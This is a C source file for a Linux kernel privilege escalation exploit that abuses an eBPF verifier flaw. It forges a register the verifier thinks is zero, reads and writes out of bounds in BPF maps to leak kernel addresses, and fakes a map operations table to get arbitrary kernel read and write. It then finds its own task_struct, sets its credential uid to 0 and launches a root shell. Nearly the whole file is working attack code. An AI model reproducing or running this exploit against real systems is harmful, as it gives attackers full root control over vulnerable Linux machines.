#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>
#include <stdint.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <linux/bpf.h>

struct bpf_insn;

#define BPF_ALSH	0xe0

/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */

#define BPF_ALU64_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_ALU32_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */

#define BPF_ALU64_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_ALU32_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

/* Short form of mov, dst_reg = src_reg */

#define BPF_MOV64_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV32_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

/* Short form of mov, dst_reg = imm32 */

#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_MOV32_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

/* BPF_LD_IMM64 macro encodes single 'load 64-bit immediate' insn */
#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = (__u32) (IMM) }),			\
	((struct bpf_insn) {					\
		.code  = 0, /* zero is reserved opcode */	\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = ((__u64) (IMM)) >> 32 })

#ifndef BPF_PSEUDO_MAP_FD
# define BPF_PSEUDO_MAP_FD	1
#endif

/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
#define BPF_LD_MAP_FD(DST, MAP_FD)				\
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)


/* Direct packet access, R0 = *(uint *) (skb->data + imm32) */

#define BPF_LD_ABS(SIZE, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS,	\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

/* Memory load, dst_reg = *(uint *) (src_reg + off16) */

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Memory store, *(uint *) (dst_reg + off16) = src_reg */

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Atomic memory add, *(uint *)(dst_reg + off16) += src_reg */

#define BPF_STX_XADD(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_XADD,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Memory store, *(uint *) (dst_reg + off16) = imm32 */

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Conditional jumps against registers, if (dst_reg 'op' src_reg) goto pc + off16 */

#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Like BPF_JMP_REG, but with 32-bit wide operands for comparison. */

#define BPF_JMP32_REG(OP, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Conditional jumps against immediates, if (dst_reg 'op' imm32) goto pc + off16 */

#define BPF_JMP_IMM(OP, DST, IMM, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Raw code statement block */

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
	((struct bpf_insn) {					\
		.code  = CODE,					\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Program exit */

#define BPF_EXIT_INSN()						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_EXIT,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_FETCH_MAP(MAP_FD, KEY) \
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), /*Move stack pointer in R10*/ \
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), /*Expand stack*/ \
        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, KEY), /*Store `key` on stack (R2)*/ \
        BPF_LD_MAP_FD(BPF_REG_1, MAP_FD), /*Prepare `map` to R1*/ \
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem) /*bpf_map_lookup_elem(map, key); // R1 == map, R2 == key*/

#define BPF_LD_MAP(MAP_FD, DST, KEY) \
        BPF_FETCH_MAP(MAP_FD, KEY), /*R0 = &map[key]*/ \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), /*if (R0 != NULL) jmp; */ \
        BPF_EXIT_INSN(), \
        BPF_LDX_MEM(BPF_DW, DST, BPF_REG_0, 0) /*DST = map[key]*/

#define BPF_ST_MAP(MAP_FD, SRC, KEY) \
        BPF_FETCH_MAP(MAP_FD, KEY), /*R0 = &map[key]*/ \
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), /*if (R0 != NULL) jmp; */ \
        BPF_EXIT_INSN(), \
        BPF_STX_MEM(BPF_DW, BPF_REG_0, SRC, 0) /*map[key] = SRC*/

// This macro will build R0 which the verifier thinks is 0,
// but actually contains 1 in R6.
// The map pointed by MAP_FD has to meet the next conditions
// map[0] == 0 && map[1] == 1 (set with map_update_elem)
#define BPF_ZERO_PRIMITIVE_R6(MAP_FD) \
        BPF_LD_MAP(MAP_FD, BPF_REG_6, 0) /* R6 = ((map[0] & 1) << 63) >> 63 (where map[0] == 0) */, \
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), \
        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 1), \
        BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63), \
        BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63), \
        BPF_LD_MAP(MAP_FD, BPF_REG_7, 1) /*R7 = map[1] & 1 (where map[1] == 1)*/ , \
        BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1), \
        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7) /* R6+R7. now the verifier thinks R0 is zero is actually 1 on runtime */

#define LOG_BUF_SIZE 65535

char bpf_log_buf[LOG_BUF_SIZE];

int bpf_create_map(enum bpf_map_type map_type, uint32_t key_size, uint32_t value_size, uint32_t max_entries) {
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };
    return syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}


int bpf_prog_load(const struct bpf_insn *insns, size_t insn_cnt, const char *license, char *log_buf, size_t log_buf_sz) {
    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (uint64_t)(insns),
        .insn_cnt = insn_cnt,
        .license = (uint64_t)license,
        .log_buf = (uint64_t)log_buf,
        .log_size = LOG_BUF_SIZE,
        .log_level = 3
    };
    return syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}


int bpf_map_lookup_elem(int fd, uint64_t key, void *value) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)&key,
        .value = (uint64_t)value,
    };
    return syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}


int bpf_map_update_elem(int fd, uint64_t key, uint64_t value, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)&key,
        .value = (uint64_t)&value,
        .flags = flags,
    };
    return syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}


int bpf_map_update_elem_ptr(int fd, uint64_t key, uint64_t *value_p, uint64_t flags) {
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)&key,
        .value = (uint64_t)value_p,
        .flags = flags,
    };
    return syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}


int bpf_obj_get_info_by_fd(int fd, uint32_t info_len, void *info) {
    union bpf_attr attr;
    memset(&attr, 0, sizeof(union bpf_attr));
    attr.info.bpf_fd = fd;
    attr.info.info_len = info_len;
    attr.info.info = (uint64_t)(info);
    return syscall(SYS_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
}


#define KERN_BASE 0xffff880000000000UL
#define KERN_TEXT 0xffffffff81000000UL
// #define OFF_OPS (0xffffffff820165c0 - KERN_TEXT)
#define OFF_OPS 0x77ff820165c0UL
#define OFF_OPS_PAGE_OFFSET_BASE (0xffffffff820165c0UL-0xffff888000000000UL)
// #define OFF_OPS (0xffffffff81a0dec0UL-0xffff880000000000UL)


int open_bpf_socket(const struct bpf_insn *insns, size_t insn_cnt) {
    int prog_fd = bpf_prog_load(insns, insn_cnt, "GPL", bpf_log_buf, LOG_BUF_SIZE);

#ifdef DEBUG
    puts(bpf_log_buf);
#endif

    int sockets[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {
        printf("failed to create socket\n");
        exit(1);
    }

    if (setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(int))) {
        perror("setsockopt");
        exit(1);
    }

    return sockets[1];
}


int reader_sock, writer_sock;
int read_map_fd, write_map_fd;
int read_target_map_fd, write_target_map_fd;

void install_read_bpf_prog(void) {
    int key;
    uint64_t value;
    read_map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), sizeof(value), 10);
    if (read_map_fd < 0) {
        perror("bpf_create_map");
        exit(1);
    }
    read_target_map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), 0x700, 1);
    if (read_target_map_fd < 0) {
        perror("bpf_create_map");
        exit(1);
    }
    struct bpf_insn prog[] = {
        BPF_ZERO_PRIMITIVE_R6(read_map_fd),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),

        // load target address from user space via map
        BPF_LD_MAP(read_map_fd, BPF_REG_8, 2),

        BPF_FETCH_MAP(read_target_map_fd, 0),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0x600),
        // subtract 0x600 from pointer pointing to data of leak_target_map + 0x600
        // I have no idea, but subtracting 0x600 in one operation will make the leaking fail.
        // 0x300 has to be subtracted twice.
        // Maybe because of alu_limit?
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6),
        // offset from map.btf to value in struct bpf_array is 0x90
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_0, 0x90),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    reader_sock = open_bpf_socket(prog, sizeof(prog) / sizeof(struct bpf_insn));
}

// https://elixir.bootlin.com/linux/v5.4.58/source/include/uapi/linux/bpf.h#L136
#define BPF_MAP_TYPE_STACK 23

void install_write_bpf_prog(void) {
    int key;
    uint64_t value;
    write_map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), sizeof(value), 512);
    if (write_map_fd < 0) {
        perror("bpf_create_map");
        exit(1);
    }
    write_target_map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), 0x700, 0x1);
    if (write_target_map_fd < 0) {
        perror("write_target_map_fd");
        exit(1);
    }
    struct bpf_insn prog[] = {
        BPF_ZERO_PRIMITIVE_R6(write_map_fd),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),

        // load fake ops address from user space via map
        BPF_LD_MAP(write_map_fd, BPF_REG_8, 2),

        BPF_FETCH_MAP(write_target_map_fd, 0),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), // save pointer in a callee saved reg (R9)
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, 0x600),
        // subtract 0x600 from pointer pointing to data of leak_target_map + 0x600
        // I have no idea, but subtracting 0x600 in one operation will make the leaking fail.
        // 0x300 has to be subtracted twice.
        // Maybe because of alu_limit?
        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6), 
        BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_6), 
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_9, 0xd0), // point R9 to the front of struct bpf_map

        BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_8, 0), // ops is located at the front of bpf_map overwrite it

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_9),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x2c), // point R8 to map.spin_lock_off
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_W, BPF_REG_8, BPF_REG_0, 0), // overwrite spin_lock_off to 0 to bypass checks

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_9),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x24), // point R8 to map.max_entries
        BPF_MOV32_IMM(BPF_REG_0, 0xffffffff),
        BPF_STX_MEM(BPF_W, BPF_REG_8, BPF_REG_0, 0), // overwrite max_entries to 0xffffffff to pass checks in array_map_get_next_key

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_9),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x18), // point R8 to map.map_type
        BPF_MOV32_IMM(BPF_REG_0, BPF_MAP_TYPE_STACK),
        BPF_STX_MEM(BPF_W, BPF_REG_8, BPF_REG_0, 0), // overwrite map_type so map_push_elem (which actually is array_map_get_next_key) can be called

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    writer_sock = open_bpf_socket(prog, sizeof(prog) / sizeof(struct bpf_insn));
}


void prepare_write_primitive(uint64_t addr_fake_ops, void *fake_ops) {
    // fake ops will be stored at `value` of `struct bpf_array`
    if (bpf_map_update_elem_ptr(write_target_map_fd, 0, fake_ops, BPF_ANY) < 0) {
        perror("bpf_map_update_elem_ptr");
        exit(1);
    }
    // tell write bpf program where the fake_ops is stored (`&(struct bpf_array).value`)
    if (bpf_map_update_elem(write_map_fd, 2, addr_fake_ops, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }
    if (bpf_map_update_elem(write_map_fd, 0, 0, BPF_ANY) < 0) {
        perror("bpf_map_update_elem_ptr");
        exit(1);
    }
    if (bpf_map_update_elem(write_map_fd, 1, 1, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }
    if (write(writer_sock, "C", 1) != 1) {
        perror("write");
        exit(1);
    }
}


int write32(uint64_t addr, uint32_t value) {
    uint64_t key = 0;
    return bpf_map_update_elem(write_target_map_fd, key, value - 1, addr);
}

struct my_bpf_map_info {
	__u32 type;
	__u32 id;
	__u32 key_size;
	__u32 value_size;
	__u32 max_entries;
	__u32 map_flags;
	char  name[BPF_OBJ_NAME_LEN];
	__u32 ifindex;
	__u32 :32;
	__u64 netns_dev;
	__u64 netns_ino;
	__u32 btf_id;
	__u32 btf_key_type_id;
	__u32 btf_value_type_id;
} __attribute__((aligned(8)));


uint32_t read32(void *addr) {
    if (bpf_map_update_elem(read_map_fd, 0, 0, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }
    if (bpf_map_update_elem(read_map_fd, 1, 1, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }
    // offsetof(struct btf, id) == 0x58
    if (bpf_map_update_elem(read_map_fd, 2, (uint64_t)(addr - 0x58), BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }

    if (write(reader_sock, "B", 1) != 1) {
        perror("write");
        exit(0);
    }

    struct my_bpf_map_info info;
    memset(&info, 0, sizeof(struct my_bpf_map_info));
    if (bpf_obj_get_info_by_fd(read_target_map_fd, sizeof(struct my_bpf_map_info), &info) < 0) {
        perror("bpf_obj_get_info_by_fd");
        exit(1);
    }
    return info.btf_id;
}


uint64_t read64(void *addr) {
    uint64_t ret = 0;
    ret |= read32(addr);
    ret |= (uint64_t)read32(addr + 4) << (4 * 8);
    return ret;
}


void cleanup(void) {
    if (bpf_map_update_elem(read_map_fd, 0, 0, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }
    if (bpf_map_update_elem(read_map_fd, 1, 1, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }
    if (bpf_map_update_elem(read_map_fd, 2, 0, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }

    if (write(reader_sock, "B", 1) != 1) {
        perror("write");
        exit(0);
    }
}


uint64_t leak_map_info(uint64_t *addr_array_map_ops, uint64_t *map_memory_user) {
    int key;
    uint64_t value;
    int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), sizeof(value), 10);
    if (map_fd < 0) {
        perror("bpf_create_map");
        exit(1);
    }
    int leak_target_map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(key), 0x700, 0x1);
    if (leak_target_map_fd < 0) {
        perror("bpf_create_map");
        exit(1);
    }

    struct bpf_insn prog[] = {
        BPF_ZERO_PRIMITIVE_R6(map_fd),
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300),

        // fetch `leak_target_map`
        BPF_FETCH_MAP(leak_target_map_fd, 0),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
        BPF_EXIT_INSN(),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0x600),
        // subtract 0x600 from pointer pointing to data of leak_target_map + 0x600
        // I have no idea, but subtracting 0x600 in one operation will make the leaking fail.
        // 0x300 has to be subtracted twice.
        // Maybe because of alu_limit?
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6), // -= 0x300
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6), // -= 0x300
        // gef➤  p (unsigned long)(&array->value)-(unsigned long)(&array->map.ops)
        // $31 = 0xd0
        BPF_ALU64_IMM(BPF_SUB, BPF_REG_0, 0xd0),
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),

        // leak address of array_map_ops and write back it back to user space via map
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
        BPF_ST_MAP(map_fd, BPF_REG_8, 2),

        // leak &(map.memory.user)
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_9, 0x50),
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_9, 0),
        BPF_ST_MAP(map_fd, BPF_REG_6, 3),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    int s = open_bpf_socket(prog, sizeof(prog) / sizeof(struct bpf_insn));

    if (bpf_map_update_elem(map_fd, 0, 0, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }
    if (bpf_map_update_elem(map_fd, 1, 1, BPF_ANY) < 0) {
        perror("bpf_map_update_elem");
        exit(1);
    }

    if (write(s, "A", 1) != 1) { // trigger bpf program
        perror("write");
        exit(1);
    }

    uint64_t addr_ops = 0;
    if (bpf_map_lookup_elem(map_fd, 2, (void *)&addr_ops) < 0) {
        perror("bpf_map_lookup_elem");
        exit(1);
    }
    *addr_array_map_ops = addr_ops;

    if (bpf_map_lookup_elem(map_fd, 3, (void *)map_memory_user) < 0) {
        perror("bpf_map_lookup_elem");
        exit(1);
    }
    return addr_ops;
}



int main(void) {
    if (prctl(PR_SET_NAME, "hogehoge") < 0) {
        perror("prctl");
        exit(1);
    }

    uint64_t addr_ops, addr_kern, page_offset_base, map_memory_user;
    leak_map_info(&addr_ops, &map_memory_user);

    addr_kern = addr_ops - OFF_OPS;
    // page_offset_base = addr_kern + 0x10000000000;
    // page_offset_base = addr_kern + 0x8000000000;
    page_offset_base = (map_memory_user / 0x100000000) * 0x100000000;
    page_offset_base = (map_memory_user / 0x10000000) * 0x10000000;
    // page_offset_base = addr_kern;
    printf("addr_ops = 0x%lx\n", addr_ops);
    printf("map_memory_user = 0x%lx\n", map_memory_user);
    printf("addr_kern = 0x%lx\n", addr_kern);
    printf("page_offset_base = 0x%lx\n", page_offset_base);

    // getchar();

    install_read_bpf_prog();
    install_write_bpf_prog();

    uint64_t addr, data;
#ifdef DEBUG
    // cheat:)
    addr = 0xffff888005c32bc8;
    addr = 0xffff888005d02bc8;
    data = read64((void *)addr);
    if (!strstr((char *)&data, "hogehoge")) {
        fprintf(stderr, "cheating failed...\n");
        exit(1);
    }
    printf("Cheated!\n");
#else
    for (addr = page_offset_base; addr < page_offset_base + 0x50000000; addr += 8) {
        if (addr % 0x100000 == 0) {
            printf("Scanning %p...\n", (void *)(addr));
        }
        data = read64((void *)addr);
        if (strstr((char *)&data, "hogehoge")) {
            printf("Found!!\n");
            break;
        }
    }
#endif
    uint64_t addr_task_struct, addr_addr_cred;
    addr_task_struct = addr - 0x648;
    addr_addr_cred = addr - 0x10;
    printf("addr_task_struct = %p\n", (void *)addr_task_struct);
    printf("addr_cred = %p\n", (void *)addr_addr_cred);


    // Show array of pointers to `struct file` opened by this process.
    // p (*(*(struct task_struct *)(0xffff888005c32580)).files).fd_array
    uint64_t addr_task_struct_files = addr_task_struct + 0x680;
    // printf("addr_task_struct_files = %p\n", (void *)addr_task_struct_files);

    uint64_t ptr_files = read64((void *)addr_task_struct_files);
    // printf("ptr_files = %p\n", (void *)ptr_files);

    uint64_t addr_task_struct_files_fd_array = ptr_files + 0xa0;
    // printf("addr_task_struct_files_fd_array = %p\n", (void *)(addr_task_struct_files_fd_array));

    uint64_t addr_file_of_map_fd = read64((void *)(addr_task_struct_files_fd_array + write_target_map_fd * 8));
    // printf("addr_file_of_map_fd = %p\n", (void *)(addr_file_of_map_fd));

    // (struct file *)->private_data points to struct map
    uint64_t addr_file_of_map_fd_private_data = addr_file_of_map_fd + 0xc8;
    // printf("addr_file_of_map_fd_private_data = %p\n", (void *)addr_file_of_map_fd_private_data);

    uint64_t addr_write_target_map = read64((void *)addr_file_of_map_fd_private_data);
    printf("addr_write_target_map = %p\n", (void *)(addr_write_target_map));

    uint64_t addr_write_target_map_value = addr_write_target_map + 0xd0;
    printf("addr_write_target_map_value = %p\n", (void *)(addr_write_target_map_value)); // this address will contain the fake ops table loaded to write_target_map_fd

    uint64_t addr_array_map_ops = read64((void *)addr_write_target_map); // ops is at the front of the struct bpf_map
    printf("addr_array_map_ops = %p\n", (void *)(addr_array_map_ops));

    uint64_t fake_ops[0x700 / 8];
    int i;
    for (i = 0; i < 0xa8 / 8; ++i) { // sizeof(struct bpf_ops) == 0xa8
        fake_ops[i] = read64((void *)(addr_array_map_ops + i * 8));
        printf("[%d] = %p\n", i, (void *)(fake_ops[i]));
        // getchar();
    }
    // overwrite ops->map_push_elem to array_map_get_next_key
    uint64_t array_map_get_next_key = addr_kern + 0x77ff81164c20;
    fake_ops[0x50 / 8] = array_map_get_next_key;
    prepare_write_primitive(addr_write_target_map_value, (void *)fake_ops);

    uint64_t addr_cred = read64((void *)addr_addr_cred);
    printf("addr_cred = %p\n", (void *)(addr_cred));
    uint64_t addr_uid = addr_cred + 4;
    write32(addr_uid, 0); // overwrite uid to 0

    printf("Now real uid is 0\n");
    printf("Change effective uid to 0\n");
    setreuid(0, 0);
    system("/bin/sh");

bye:
    getchar();
    cleanup();
    printf("bye\n");
    return 0;
}
